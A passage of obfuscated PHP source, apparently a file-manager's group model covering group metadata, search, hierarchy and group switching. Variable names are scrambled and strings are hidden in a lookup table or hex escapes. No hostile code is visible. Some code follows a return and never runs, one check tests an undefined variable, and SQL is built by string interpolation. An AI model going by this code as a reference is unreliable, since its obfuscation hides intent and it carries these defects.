$ªãã´¯ƒ = false) { $ÌÊÕÊ„ =& $_SERVER[°‰†òö¯]; if (!$ªãã´¯ƒ) { $„™Š©† = $this->getInfoSimple($øìË²œ‘); $ªãã´¯ƒ = $„™Š©†[$ÌÊÕÊ„[32]]; } if (!Input::check($ªãã´¯ƒ, $ÌÊÕÊ„[662])) { $this->metaSet($øìË²œ‘, $ÌÊÕÊ„[540], null); $this->metaSet($øìË²œ‘, $ÌÊÕÊ„[539], null); return; } $„¾ø¶˜¹ = array($ÌÊÕÊ„[540] => str_replace($ÌÊÕÊ„[53], $ÌÊÕÊ„[12], Pinyin::get($ªãã´¯ƒ)), $ÌÊÕÊ„[539] => Pinyin::get($ªãã´¯ƒ, $ÌÊÕÊ„[663])); $this->metaSet($øìË²œ‘, $„¾ø¶˜¹); } protected function metaSet($šÜØÆ™Ç, $Úª›ŠêÕ = null, $Ğ‰ÌİªÜ = null) { $this->_clearCache($šÜØÆ™Ç); return parent::metaSet($šÜØÆ™Ç, $Úª›ŠêÕ, $Ğ‰ÌİªÜ); } protected function groupStatus($‰ê‰ÍÓ, $¯“áõ‹û) { $±™ÛŒŒŞ =& $_SERVER[°‰†òö¯]; $ğËÏ¨–ı = $this->getInfoSimple($‰ê‰ÍÓ); if (!$ğËÏ¨–ı) { return !1; } $this->_clearCache($‰ê‰ÍÓ); return $this->metaSet($‰ê‰ÍÓ, $±™ÛŒŒŞ[811], $¯“áõ‹û); if ($¯“áõ‹û == $±™ÛŒŒŞ[91]) { $ÇËüıĞ® = $this->parentLevelArray($ğËÏ¨–ı[$±™ÛŒŒŞ[588]]); } else { } $ÇËüıĞ®[] = $ğËÏ¨–ı[$±™ÛŒŒŞ[1972]]; $ù´Ö‰­ = array(); foreach ($ÇËüıĞ® as $‰ê‰ÍÓ) { $ù´Ö‰­[] = array($±™ÛŒŒŞ[1972] => $‰ê‰ÍÓ, $±™ÛŒŒŞ[97] => $±™ÛŒŒŞ[811], $±™ÛŒŒŞ[452] => $¯“áõ‹û); $this->_clearCache($‰ê‰ÍÓ); } return Model($±™ÛŒŒŞ[2065])->addAll($ù´Ö‰­, array(), !0); } protected function groupRemove($­á¶ç††, $ÇØ´®‰Ú = false) { $çî÷­æ =& $_SERVER[°‰†òö¯]; $ËçÇê©¸ = array($çî÷­æ[1972] => $­á¶ç††); $¾ğ¯öÙ¡ = $this->where($ËçÇê©¸)->find(); if (!$¾ğ¯öÙ¡ || $¾ğ¯öÙ¡[$çî÷­æ[192]] == 0) { return !1; } if (!$ÇØ´®‰Ú) { $µ²è·¢¾ = $this->getInfoSimple($¾ğ¯öÙ¡[$çî÷­æ[192]]); $this->_changeChildLevel($¾ğ¯öÙ¡, $µ²è·¢¾, !0); $this->where(array($çî÷­æ[192] => $­á¶ç††))->save(array($çî÷­æ[192] => $¾ğ¯öÙ¡[$çî÷­æ[192]])); $this->_clearCache($µ²è·¢¾[$çî÷­æ[1972]]); } Model($çî÷­æ[2065])->where($ËçÇê©¸)->delete(); Model($çî÷­æ[2066])->where($ËçÇê©¸)->delete(); Model($çî÷­æ[891])->groupRootRemove($­á¶ç††); $this->_clearCache($¾ğ¯öÙ¡[$çî÷­æ[192]]); return $this->where($ËçÇê©¸)->delete(); } protected function groupSort($½´¬º¤) { $â·‰ƒÆ§ =& $_SERVER[°‰†òö¯]; $¾¢Ø»¶ = array(); foreach ($½´¬º¤ as $äÚÜùì => $”±ŞœÌ) { $¾¢Ø»¶[] = array($â·‰ƒÆ§[1972], $”±ŞœÌ, $â·‰ƒÆ§[1996], $äÚÜùì + 1); } $this->saveAll($¾¢Ø»¶); } public function listData() { $Ê¿§ñëŸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ê¿§ñëŸ[$_SERVER[°‰†òö¯][447]]); return $Ê¿§ñëŸ; } private function _makeOrder($›»Ç——™ = '') { $«’Ğ¾™ =& $_SERVER[°‰†òö¯]; $øãÃÓıû = array($«’Ğ¾™[1972], $«’Ğ¾™[32], $«’Ğ¾™[1960], $«’Ğ¾™[233]); $İÍÊáúú = array($«’Ğ¾™[525] => $«’Ğ¾™[526], $«’Ğ¾™[527] => $«’Ğ¾™[528]); $äºâğúì = Input::get($«’Ğ¾™[532], $«’Ğ¾™[7], $«’Ğ¾™[1976], $øãÃÓıû); $·Ä›åĞ = Input::get($«’Ğ¾™[533], $«’Ğ¾™[7], $«’Ğ¾™[2067], array($«’Ğ¾™[2067], $«’Ğ¾™[527])); $·Ä›åĞ = $İÍÊáúú[$·Ä›åĞ]; $›»Ç——™ = $›»Ç——™ . "{$äºâğúì}\x20{$·Ä›åĞ}\x2c\x20\x67\162\x6f\x75\x70\111\104\40\141\x73\x63"; return $this->order($›»Ç——™); } public function listChild($¡‹‘êˆ¡) { $—¨áÆ˜ì =& $_SERVER[°‰†òö¯]; $¬èìäãÖ = $this->where(array($—¨áÆ˜ì[192] => $¡‹‘êˆ¡))->_makeOrder()->selectPage(200); $this->_listDataApply($¬èìäãÖ[$—¨áÆ˜ì[447]]); return $¬èìäãÖ; } public function listChildIds($ì©÷¯—«) { $òüíŒ… =& $_SERVER[°‰†òö¯]; if (is_string($äø™¦É)) { $ì©÷¯—« = explode($òüíŒ…[50], $ì©÷¯—«); } $ÆÕÕÊ‹ = $this->where(array($òüíŒ…[1972] => array($òüíŒ…[7], $ì©÷¯—«)))->field($òüíŒ…[2068])->select(); if (!$ÆÕÕÊ‹) { return !1; } $ëÎëÏ¦Á = array(); foreach ($ÆÕÕÊ‹ as $š›ƒ§İ¬) { $ëÎëÏ¦Á[] = "\x73\x65\154\x65\143\164\x20\147\162\157\165\160\x49\x44\x20\x66\162\x6f\155\x20\x60\147\x72\x6f\x75\160\x60\40\167\150\145\162\145\40\x70\141\162\145\x6e\164\x4c\145\166\x65\154\x20\x6c\x69\x6b\145\x20\47{$š›ƒ§İ¬[$òüíŒ…[588]]}{$š›ƒ§İ¬[$òüíŒ…[1972]]}\54\x25\47"; } $ëÎëÏ¦Á = implode($òüíŒ…[2069], $ëÎëÏ¦Á); $ÆÕÕÊ‹ = $this->query($ëÎëÏ¦Á); if (!$ÆÕÕÊ‹) { return array(); } $ì©÷¯—« = array_to_keyvalue($ÆÕÕÊ‹, $òüíŒ…[12], $òüíŒ…[1972]); return array_unique($ì©÷¯—«); } public function listByID($±øçÌ·˜) { $©«€ˆŠ =& $_SERVER[°‰†òö¯]; if (!$±øçÌ·˜) { return array(); } $ÔÌ´ÃËÙ = array($©«€ˆŠ[1972] => array($©«€ˆŠ[7], $±øçÌ·˜)); $¢Ùüó’Ê = $this->where($ÔÌ´ÃËÙ)->select(); $¢Ùüó’Ê = array_sort_keep($¢Ùüó’Ê, $©«€ˆŠ[1972], $±øçÌ·˜); $this->_listDataApply($¢Ùüó’Ê); return $¢Ùüó’Ê; } public function listSearch($‘ØÚˆé) { $¿£øĞø² =& $_SERVER[°‰†òö¯]; $çèº½Çà = trim($‘ØÚˆé[$¿£øĞø²[2070]]); $¯ÆÊÇëÌ = explode($¿£øĞø²[53], $çèº½Çà); if (!$çèº½Çà || count($¯ÆÊÇëÌ) == 1) { return $this->listSearchNow($‘ØÚˆé); } $µ°úÚš = array($¿£øĞø²[447] => array()); foreach ($¯ÆÊÇëÌ as $¸½õ‹šÜ) { if (!trim($¸½õ‹šÜ)) { continue; } $‘ØÚˆé[$¿£øĞø²[2070]] = $¸½õ‹šÜ; $ÒÎÊ˜‰£ = $this->listSearchNow($‘ØÚˆé); $µ°úÚš[$¿£øĞø²[447]] = array_merge($µ°úÚš[$¿£øĞø²[447]], $ÒÎÊ˜‰£[$¿£øĞø²[447]]); } $µ°úÚš[$¿£øĞø²[447]] = array_unique_by_key($µ°úÚš[$¿£øĞø²[447]], $¿£øĞø²[1972]); $µ°úÚš[$¿£øĞø²[444]] = array($¿£øĞø²[445] => count($µ°úÚš[$¿£øĞø²[447]]), $¿£øĞø²[441] => 20, $¿£øĞø²[430] => 1, $¿£øĞø²[446] => 1); return $µ°úÚš; } public function listSearchNow($œÚñî) { $üÖ¯ =& $_SERVER[°‰†òö¯]; $õ¨°ÑŞ = trim($œÚñî[$üÖ¯[2070]]); $ñ âô£– = isset($œÚñî[$üÖ¯[2071]]) ? $œÚñî[$üÖ¯[2071]] : !1; if (!trim($õ¨°ÑŞ)) { return !1; } $õ¨°ÑŞ = str_replace($üÖ¯[2072], $üÖ¯[2073], $õ¨°ÑŞ); $ˆÀØÒª = array($üÖ¯[1972] => array($üÖ¯[461], "{$õ¨°ÑŞ}\x25"), $üÖ¯[32] => array($üÖ¯[461], "\x25{$õ¨°ÑŞ}\x25"), $üÖ¯[1075] => $üÖ¯[2074]); if ($ñ âô£–) { $ ó–“äã = $this->getInfoSimple($ñ âô£–); $«ş‡ç™ = $ ó–“äã[$üÖ¯[588]] . $ñ âô£– . $üÖ¯[620]; $ˆÀØÒª = array($ˆÀØÒª, array($üÖ¯[588] => array($üÖ¯[461], $«ş‡ç™))); } $ˆÀØÒª = $this->parseWhereLike($ˆÀØÒª); $¤É£¶†Â = $this->_makeOrder()->where($ˆÀØÒª)->selectPage(20); $¤É£¶†Â = $¤É£¶†Â ? $¤É£¶†Â : array($üÖ¯[447] => array(), $üÖ¯[444] => array()); if (!$¤É£¶†Â || count($¤É£¶†Â[$üÖ¯[447]]) < 5 && Input::check($õ¨°ÑŞ, $üÖ¯[395])) { $‹†åø‹Å = $this->groupChildrenAll($ñ âô£–); $äì¨Î‚ = $this->_searchFromMeta($üÖ¯[539], $õ¨°ÑŞ, 10, $‹†åø‹Å); $»¼†‹†ı = $this->_searchFromMeta($üÖ¯[540], $õ¨°ÑŞ, 10, $‹†åø‹Å); $ï»²“›Ë = array_merge($äì¨Î‚, $»¼†‹†ı, $¤É£¶†Â[$üÖ¯[447]]); $¤É£¶†Â[$üÖ¯[447]] = array_unique_by_key($ï»²“›Ë, $üÖ¯[1972]); $¤É£¶†Â[$üÖ¯[444]][$üÖ¯[445]] = count($¤É£¶†Â[$üÖ¯[447]]); $¤É£¶†Â[$üÖ¯[444]][$üÖ¯[446]] = ceil($¤É£¶†Â[$üÖ¯[444]][$üÖ¯[445]] / $¤É£¶†Â[$üÖ¯[444]][$üÖ¯[441]]); } $this->_listDataApply($¤É£¶†Â[$üÖ¯[447]]); return $¤É£¶†Â; } protected function groupChildrenAll($şÆÅ‡¬×) { $Æñâª÷¬ =& $_SERVER[°‰†òö¯]; if (!$şÆÅ‡¬×) { return !1; } if (!is_array($şÆÅ‡¬×)) { $şÆÅ‡¬× = array($şÆÅ‡¬×); } $Œ±Ûûè‘ = $şÆÅ‡¬×; foreach ($şÆÅ‡¬× as $Ûæ²À™ƒ) { $ùåšèª– = $this->getInfoSimple($Ûæ²À™ƒ); $¬Ó„Å = array($Æñâª÷¬[588] => array($Æñâª÷¬[461], $ùåšèª–[$Æñâª÷¬[588]] . $Ûæ²À™ƒ . $Æñâª÷¬[620])); $•£›š»“ = $this->field($Æñâª÷¬[1972])->where($¬Ó„Å)->select(); $Œ±Ûûè‘ = array_merge($Œ±Ûûè‘, array_to_keyvalue($•£›š»“, $Æñâª÷¬[12], $Æñâª÷¬[1972])); } return array_unique($Œ±Ûûè‘); } private function _searchFromMeta($ªĞÊÊ, $ÕºÉÅ¯ó, $¢©¢£òê, $æ„¯¼ôÂ) { $ú§Ñ§Æš =& $_SERVER[°‰†òö¯]; $ÕºÉÅ¯ó = strtolower($ÕºÉÅ¯ó); $€ÚéÈ² = array($ú§Ñ§Æš[97] => $ªĞÊÊ, $ú§Ñ§Æš[452] => array($ú§Ñ§Æš[461], "\45{$ÕºÉÅ¯ó}\45")); $€ÚéÈ² = $this->parseWhereLike($€ÚéÈ²); if ($æ„¯¼ôÂ) { $€ÚéÈ²[$ú§Ñ§Æš[1972]] = array($ú§Ñ§Æš[7], $æ„¯¼ôÂ); } $êë½»Ç› = Model($ú§Ñ§Æš[2075])->where($€ÚéÈ²)->limit($¢©¢£òê)->select(); if (!$êë½»Ç›) { return array(); } $êë½»Ç› = array_to_keyvalue($êë½»Ç›, $ú§Ñ§Æš[12], $ú§Ñ§Æš[1972]); $¸Ì­ï§º = $this->where(array($ú§Ñ§Æš[2064] => array($ú§Ñ§Æš[7], $êë½»Ç›)))->select(); if (!$¸Ì­ï§º) { return array(); } return $¸Ì­ï§º; } protected function _listDataApplyItem($¿§¶ªŸÛ) { $¢Ò¦Üİ = array($¿§¶ªŸÛ); $this->_listDataApply($¢Ò¦Üİ); return $¢Ò¦Üİ[0]; } protected function _listDataApply(&$Üğ§½ØÚ) { $•®­«ÍÓ =& $_SERVER[°‰†òö¯]; if (!$Üğ§½ØÚ) { return; } $ŞÎÓ‚‚» = array_to_keyvalue($Üğ§½ØÚ, $•®­«ÍÓ[12], $•®­«ÍÓ[1972]); $this->_listAppendChildren($Üğ§½ØÚ); $this->_listAppendChildrenMember($Üğ§½ØÚ); $this->_listAppendMeta($Üğ§½ØÚ, $ŞÎÓ‚‚»); $this->_listAppendParent($Üğ§½ØÚ); $this->_listAppendSourceRoot($Üğ§½ØÚ, $ŞÎÓ‚‚»); } private function _listAppendChildren(&$Â°«Ö§ı) { $ºöìãù =& $_SERVER[°‰†òö¯]; $‹ĞĞıİ‰ = array_to_keyvalue($Â°«Ö§ı, $ºöìãù[12], $ºöìãù[1972]); $­õİ…›ò = array($ºöìãù[192] => array($ºöìãù[7], $‹ĞĞıİ‰)); $ıåâ’ÚØ = array($ºöìãù[192], $ºöìãù[2076] => $ºöìãù[569]); $šÂ††¾Ë = $this->field($ıåâ’ÚØ)->where($­õİ…›ò)->group($ºöìãù[192])->select(); $‚ÉÃŞ¯¹ = array_to_keyvalue($šÂ††¾Ë, $ºöìãù[192], $ºöìãù[569]); foreach ($Â°«Ö§ı as &$ ÑÎİ×’) { $Û‘‘†½ = $ ÑÎİ×’[$ºöìãù[1972]]; $ ÑÎİ×’[$ºöìãù[2077]] = isset($‚ÉÃŞ¯¹[$Û‘‘†½]) ? intval($‚ÉÃŞ¯¹[$Û‘‘†½]) : !1; } unset($ ÑÎİ×’); } private function _listAppendChildrenMember(&$Î¶ÔŒñ) { $¥§¤¥±Ç =& $_SERVER[°‰†òö¯]; $»¸ã…Ûá = array_to_keyvalue($Î¶ÔŒñ, $¥§¤¥±Ç[12], $¥§¤¥±Ç[1972]); $„€›Œóù = array($¥§¤¥±Ç[1972] => array($¥§¤¥±Ç[7], $»¸ã…Ûá)); $ÄÀï±Å³ = array($¥§¤¥±Ç[1972], $¥§¤¥±Ç[2076] => $¥§¤¥±Ç[569]); $ìèÑÇÒè = Model($¥§¤¥±Ç[2066])->field($ÄÀï±Å³)->where($„€›Œóù)->group($¥§¤¥±Ç[1972])->select(); $üİ»†¡ë = array_to_keyvalue($ìèÑÇÒè, $¥§¤¥±Ç[1972], $¥§¤¥±Ç[569]); foreach ($Î¶ÔŒñ as &$æ˜¸–Œ×) { $…½½ÆøÜ = $æ˜¸–Œ×[$¥§¤¥±Ç[1972]]; $æ˜¸–Œ×[$¥§¤¥±Ç[2078]] = isset($üİ»†¡ë[$…½½ÆøÜ]) ? intval($üİ»†¡ë[$…½½ÆøÜ]) : !1; } unset($æ˜¸–Œ×); } private function _listAppendMeta(&$‰¸ßÜË‹, $ù†¸ˆş) { $µ“—ÑÜÆ =& $_SERVER[°‰†òö¯]; $ÎÒ¬½­ = array($µ“—ÑÜÆ[1972] => array($µ“—ÑÜÆ[7], $ù†¸ˆş)); $‡¿ÑĞ¤— = Model($µ“—ÑÜÆ[2065])->where($ÎÒ¬½­)->select(); $‡¿ÑĞ¤— = array_to_keyvalue_group($‡¿ÑĞ¤—, $µ“—ÑÜÆ[1972]); foreach ($‡¿ÑĞ¤— as &$ÑúÔ¨âè) { $ÑúÔ¨âè = array_to_keyvalue($ÑúÔ¨âè, $µ“—ÑÜÆ[97], $µ“—ÑÜÆ[452]); } unset($ÑúÔ¨âè); foreach ($‰¸ßÜË‹ as &$ë‹êõö) { $ë‹êõö[$µ“—ÑÜÆ[543]] = array(); if (isset($‡¿ÑĞ¤—[$ë‹êõö[$µ“—ÑÜÆ[1972]]])) { $ë‹êõö[$µ“—ÑÜÆ[543]] = $‡¿ÑĞ¤—[$ë‹êõö[$µ“—ÑÜÆ[1972]]]; } } unset($ë‹êõö); } protected function parentLevelArray($Å»­ğ©°) { $ı± “ƒ =& $_SERVER[°‰†òö¯]; $Å»­ğ©° = explode($ı± “ƒ[50], trim($Å»­ğ©°, $ı± “ƒ[50])); $Å»­ğ©° = array_remove_value($Å»­ğ©°, $ı± “ƒ[230]); return $Å»­ğ©°; } protected function parentInGroup($“½¬ØóĞ, $Îñ§Í) { $ß—ìÎ€Ü =& $_SERVER[°‰†òö¯]; $ñ¶Œ’øŒ = $this->getInfoSimple($“½¬ØóĞ); if (!$ñ¶Œ’øŒ) { return !0; } $è‚îÁ®° = $this->parentLevelArray($ñ¶Œ’øŒ[$ß—ìÎ€Ü[588]]); $è‚îÁ®°[] = $“½¬ØóĞ; foreach ($è‚îÁ®° as $“½¬ØóĞ) { if (in_array($“½¬ØóĞ . $ß—ìÎ€Ü[12], $Îñ§Í)) { return !0; } } return !1; } private function _listAppendParent(&$³­¾¯æœ) { $£å÷÷¹Ô =& $_SERVER[°‰†òö¯]; $˜÷®«ô€ = array(); foreach ($³­¾¯æœ as &$‹£¢®¨§) { $˜÷®«ô€[$‹£¢®¨§[$£å÷÷¹Ô[1972]]] = $‹£¢®¨§[$£å÷÷¹Ô[32]]; $İğ˜¡¨‹ = $this->parentLevelArray($‹£¢®¨§[$£å÷÷¹Ô[588]]); foreach ($İğ˜¡¨‹ as $·ŒªÆßÊ) { if (!isset($˜÷®«ô€[$·ŒªÆßÊ])) { $˜÷®«ô€[$·ŒªÆßÊ] = 0; } } } unset($‹£¢®¨§); foreach ($˜÷®«ô€ as $ˆ÷®£ => $÷ä›åÂ˜) { if ($÷ä›åÂ˜) { continue; } $±¾Ó‡ÛÊ = $this->getInfoSimple($ˆ÷®£); $˜÷®«ô€[$ˆ÷®£] = $±¾Ó‡ÛÊ[$£å÷÷¹Ô[32]]; } $“Ò—òÓñ = $GLOBALS[$£å÷÷¹Ô[6]][$£å÷÷¹Ô[92]][$£å÷÷¹Ô[2079]]; if (KodUser::isRoot()) { $“Ò—òÓñ = !1; } foreach ($³­¾¯æœ as &$‹£¢®¨§) { $İğ˜¡¨‹ = $this->parentLevelArray($‹£¢®¨§[$£å÷÷¹Ô[588]]); $ŒğÒµ¿Õ = $£å÷÷¹Ô[12]; foreach ($İğ˜¡¨‹ as $ˆ÷®£ => $·ŒªÆßÊ) { if ($“Ò—òÓñ && $ˆ÷®£ == 0) { continue; } $ŒğÒµ¿Õ .= $˜÷®«ô€[$·ŒªÆßÊ] . $£å÷÷¹Ô[8]; } if ($İğ˜¡¨‹) { $ŒğÒµ¿Õ .= $‹£¢®¨§[$£å÷÷¹Ô[32]]; } $‹£¢®¨§[$£å÷÷¹Ô[593]] = str_replace($£å÷÷¹Ô[256], $£å÷÷¹Ô[8], $ŒğÒµ¿Õ); } unset($‹£¢®¨§); } private function _listAppendSourceRoot(&$ş›ú§€, $²¢ĞÅ€™) { $ ÄÅóØ’ =& $_SERVER[°‰†òö¯]; $ÆşÍÇè = Model($ ÄÅóØ’[891])->listSourceRoot(SourceModel::TYPE_GROUP, $²¢ĞÅ€™); $ÆşÍÇè = array_to_keyvalue($ÆşÍÇè, $ ÄÅóØ’[573]); $ÆşÍÇè = array_remove_key($ÆşÍÇè, $ ÄÅóØ’[573]); foreach ($ş›ú§€ as &$³î¦‘¤Ğ) { $³î¦‘¤Ğ[$ ÄÅóØ’[90]] = $ÆşÍÇè[$³î¦‘¤Ğ[$ ÄÅóØ’[1972]]] ? $ÆşÍÇè[$³î¦‘¤Ğ[$ ÄÅóØ’[1972]]] : array(); } unset($³î¦‘¤Ğ); } protected function groupMerge($…ÃÀŒöŸ) { $…ÃÀŒöŸ = array_values(array_unique($…ÃÀŒöŸ)); $ğÑğ¾Ÿû = array(); for ($Ûà¾¯â = 0; $Ûà¾¯â < count($…ÃÀŒöŸ); $Ûà¾¯â++) { $È·ñÎœ¡ = !1; for ($ßĞ¤ÌÌ = 0; $ßĞ¤ÌÌ < count($…ÃÀŒöŸ); $ßĞ¤ÌÌ++) { if ($Ûà¾¯â == $ßĞ¤ÌÌ) { continue; } if ($this->isParentOf($…ÃÀŒöŸ[$ßĞ¤ÌÌ], $…ÃÀŒöŸ[$Ûà¾¯â])) { $È·ñÎœ¡ = !0; break; } } if (!$È·ñÎœ¡) { $ğÑğ¾Ÿû[] = $…ÃÀŒöŸ[$Ûà¾¯â]; } } return $ğÑğ¾Ÿû; } protected function isParentOf($ùÄ‘¤±ó, $ŞŸÅÏÜ) { $­û¥”¢ =& $_SERVER[°‰†òö¯]; if (!$ùÄ‘¤±ó || !$ŞŸÅÏÜ || $ùÄ‘¤±ó == $ŞŸÅÏÜ) { return !1; } $è¹°ÍñÛ = $this->getInfoSimple($ùÄ‘¤±ó); $°ÈÙ¾Úœ = $this->getInfoSimple($ŞŸÅÏÜ); $ÒÖŸÌüÅ = $è¹°ÍñÛ[$­û¥”¢[588]] . $ùÄ‘¤±ó . $­û¥”¢[50]; if (substr($°ÈÙ¾Úœ[$­û¥”¢[588]], 0, strlen($ÒÖŸÌüÅ)) == $ÒÖŸÌüÅ) { return !0; } return !1; } public function groupShowRoot($§¹Ğ‰çê, $¦†óæ˜Ç = false) { $¬Áˆµ…Ó =& $_SERVER[°‰†òö¯]; $î¼ şôÕ = $this->getInfo($§¹Ğ‰çê); if (!$î¼ şôÕ) { return array(); } $Öïˆßİ = $this->parentLevelArray($î¼ şôÕ[$¬Áˆµ…Ó[588]]); $³Ş†¶à = array($§¹Ğ‰çê); if (count($Öïˆßİ) == 0) { return $³Ş†¶à; } if ($¦†óæ˜Ç && count($Öïˆßİ) == 1) { return $³Ş†¶à; } if (!$î¼ şôÕ[$¬Áˆµ…Ó[543]] || !isset($î¼ şôÕ[$¬Áˆµ…Ó[543]][$¬Áˆµ…Ó[2062]]) || $î¼ şôÕ[$¬Áˆµ…Ó[543]][$¬Áˆµ…Ó[2062]] == $¬Áˆµ…Ó[837]) { return $this->groupShowRoot($Öïˆßİ[count($Öïˆßİ) - 1], $¦†óæ˜Ç); } if ($î¼ şôÕ[$¬Áˆµ…Ó[543]][$¬Áˆµ…Ó[2062]] == $¬Áˆµ…Ó[434]) { $•Ÿöõ’ê = explode($¬Áˆµ…Ó[50], $î¼ şôÕ[$¬Áˆµ…Ó[543]][$¬Áˆµ…Ó[2063]]); if ($•Ÿöõ’ê) { $³Ş†¶à = array_merge($³Ş†¶à, $•Ÿöõ’ê); } } return $³Ş†¶à; } protected function resetParentLevel() { $åÄ‘Š =& $_SERVER[°‰†òö¯]; $¦•¯¦©ä = $åÄ‘Š[1972]; $»¸€çåï = $this->select(); $»¸€çåï = array_to_keyvalue($»¸€çåï, $¦•¯¦©ä); foreach ($»¸€çåï as $á¨ÚÒ Ã) { $îÌÀËíˆ = $á¨ÚÒ Ã; $´û¢éûë = array(); while ($îÌÀËíˆ[$åÄ‘Š[192]] != 0) { $´û¢éûë[] = $îÌÀËíˆ[$åÄ‘Š[192]]; $îÌÀËíˆ = $»¸€çåï[$îÌÀËíˆ[$åÄ‘Š[192]]]; } $´û¢éûë[] = 0; $´û¢éûë = $åÄ‘Š[50] . implode($åÄ‘Š[50], array_reverse($´û¢éûë)) . $åÄ‘Š[50]; $this->setNamePinyin($á¨ÚÒ Ã[$¦•¯¦©ä], $á¨ÚÒ Ã[$åÄ‘Š[32]]); $this->where(array($¦•¯¦©ä => $á¨ÚÒ Ã[$¦•¯¦©ä]))->save(array($åÄ‘Š[659] => $´û¢éûë)); } return $»¸€çåï; } public function groupNameAuto($Û òªâ, $áÁÓùö¨) { $²Ú½™û =& $_SERVER[°‰†òö¯]; $¦ĞÎ„œ‚ = $this->where(array($²Ú½™û[479] => $Û òªâ))->getField($²Ú½™û[32], !0); if (!$¦ĞÎ„œ‚ || !in_array($áÁÓùö¨, $¦ĞÎ„œ‚)) { return $áÁÓùö¨; } for ($ÔÏÓğş° = 1; $ÔÏÓğş° <= count($¦ĞÎ„œ‚) + 1; $ÔÏÓğş°++) { $Õ¤¦ì‘à = $áÁÓùö¨ . "\x28{$ÔÏÓğş°}\x29"; if (!in_array($Õ¤¦ì‘à, $¦ĞÎ„œ‚)) { return $Õ¤¦ì‘à; } } } public function groupSwitch($“ğÇí®, $¢›ø´Š‚) { $îÏñšá =& $_SERVER[°‰†òö¯]; $œ»Ú’®ª = array($îÏñšá[1972] => array($îÏñšá[7], array($“ğÇí®, $¢›ø´Š‚))); $’º‘Ú Æ = $this->where($œ»Ú’®ª)->select(); $’º‘Ú Æ = array_to_keyvalue($’º‘Ú Æ, $îÏñšá[1972]); if (!isset($’º‘Ú Æ[$“ğÇí®]) || !isset($’º‘Ú Æ[$¢›ø´Š‚]) || $’º‘Ú Æ[$“ğÇí®][$îÏñšá[192]] == 0) { return !1; } $œ»Ú’®ª = array($îÏñšá[1972] => $“ğÇí®); $Éèş‰ş” = Model($îÏñšá[2066])->where($œ»Ú’®ª)->select(); if (!$Éèş‰ş”) { $Éèş‰ş” = array(); } foreach ($Éèş‰ş” as $°ÏÏìª®) { $´ÑÛåÎ˜ = $°ÏÏìª®[$îÏñšá[1771]]; $œ»Ú’®ª = array($îÏñšá[1771] => $´ÑÛåÎ˜, $îÏñšá[1972] => $¢›ø´Š‚); $ïÁìÊ÷ = Model($îÏñšá[2066])->where($œ»Ú’®ª)->find(); if (!$ïÁìÊ÷) { $äœÅ£× = array($¢›ø´Š‚ => $°ÏÏìª®[$îÏñšá[2080]]); Model($îÏñšá[601])->userGroupAdd($´ÑÛåÎ˜, $äœÅ£×); } Model($îÏñšá[601])->userGroupRemove($´ÑÛåÎ˜, $“ğÇí®); } $œ»Ú’®ª = array($îÏñšá[190] => 2, $îÏñšá[192] => 0, $îÏñšá[487] => 1, $îÏñšá[573] => array($îÏñšá[7], array($“ğÇí®, $¢›ø´Š‚))); $±›ƒ¥Üª = Model($îÏñšá[891])->where($œ»Ú’®ª)->field($îÏñšá[2081])->select(); $±›ƒ¥Üª = array_to_keyvalue($±›ƒ¥Üª, $îÏñšá[573], $îÏñšá[193]); $ù»Ãå‘ˆ = !empty($±›ƒ¥Üª[$“ğÇí®]) ? $±›ƒ¥Üª[$“ğÇí®] : !1; if ($ù»Ãå‘ˆ) { if (!$±›ƒ¥Üª[$¢›ø´Š‚]) { $±›ƒ¥Üª[$¢›ø´Š‚] = Model($îÏñšá[891])->groupRootAdd($¢›ø´Š‚); } $•«şÚ£ = $±›ƒ¥Üª[$¢›ø´Š‚]; $œ»Ú’®ª = array($îÏñšá[192] => $ù»Ãå‘ˆ); $±›ƒ¥Üª = Model($îÏñšá[891])->where($œ»Ú’®ª)->field($îÏñšá[2082])->select(); if (!$±›ƒ¥Üª) { $±›ƒ¥Üª = array(); } Model($îÏñšá[891])->moveClearAuth = !1; foreach ($±›ƒ¥Üª as $¯Ë«À÷½) { $§ÍñÍë¢ = $¯Ë«À÷½[$îÏñšá[487]] == $îÏñšá[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($îÏñšá[891])->move($¯Ë«À÷½[$îÏñšá[193]], $•«şÚ£, $§ÍñÍë¢); } Model($îÏñšá[891])->moveClearAuth = !0; $œ»Ú’®ª = array($îÏñšá[190] => 2, $îÏñšá[573] => $“ğÇí®); $ŒäğæêÓ = array($îÏñšá[573] => $¢›ø´Š‚); Model($îÏñšá[2083])->where($œ»Ú’®ª)->save($ŒäğæêÓ); Model($îÏñšá[2084])->where($œ»Ú’®ª)->save($ŒäğæêÓ); } $this->_changeChildLevel($’º‘Ú Æ[$“ğÇí®], $’º‘Ú Æ[$¢›ø´Š‚], !0); $this->where(array($îÏñšá[192] => $“ğÇí®))->save(array($îÏñšá[192] => $¢›ø´Š‚)); $this->_clearChildrenCache($’º‘Ú Æ[$¢›ø´Š‚]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($áğ©ëúÀ) { $¡ÓÙ‹®£ =& $_SERVER[°‰†òö¯]; return array($¡ÓÙ‹®£[2085] => array($áğ©ëúÀ[0], $¡ÓÙ‹®£[2086]), $¡ÓÙ‹®£[2087] => array($áğ©ëúÀ[0], $¡ÓÙ‹®£[2088])); } protected function get($¬ê­İš) { $·ó¬Îü =& $_SERVER[°‰†òö¯]; $Âõ’ïá¢ = Model($·ó¬Îü[589])->metaGet($¬ê­İš, $·ó¬Îü[2089]); $©À›Ç– = json_decode($Âõ’ïá¢, !0); return $©À›Ç– ? $©À›Ç– : array($·ó¬Îü[2090] => $·ó¬Îü[91], $·ó¬Îü[447] => array()); } protected function set($ÚÇ»¡¤, $½Ÿ°­³) { $Ãæ¨ŸÓİ =& $_SERVER[°‰†òö¯]; $½Ÿ°­³ = $½Ÿ°­³ ? $½Ÿ°­³ : array($Ãæ¨ŸÓİ[2090] => $Ãæ¨ŸÓİ[91], $Ãæ¨ŸÓİ[447] => array()); return Model($Ãæ¨ŸÓİ[589])->metaSet($ÚÇ»¡¤, $Ãæ¨ŸÓİ[2089], json_encode($½Ÿ°­³)); } protected function getByTagID($âÎìÁò¢, $—ùÈŞñÍ) { $©Ñƒı´ =& $_SERVER[°‰†òö¯]; if (!$âÎìÁò¢ || !$—ùÈŞñÍ) { return !1; } if (!Model($©Ñƒı´[589])->getInfoSimple($âÎìÁò¢)) { return !1; } $Õ†ÁƒÀƒ = $this->get($âÎìÁò¢); if (!$Õ†ÁƒÀƒ || 